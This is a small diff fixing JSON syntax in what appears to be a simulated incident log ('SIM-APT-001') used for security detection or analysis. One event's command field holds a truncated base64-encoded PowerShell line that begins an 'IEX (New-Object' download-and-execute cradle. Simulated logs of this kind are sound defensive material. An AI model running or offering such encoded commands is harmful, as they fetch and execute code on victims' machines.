@@ -42,7 +42,7 @@
     "user": "j.smith",
     "event_type": "process_start",
     "source_ip": "185.220.101.44",
-    "command": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAI...")
+    "command": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAI..."
   },
   {
     "incident_id": "SIM-APT-001",
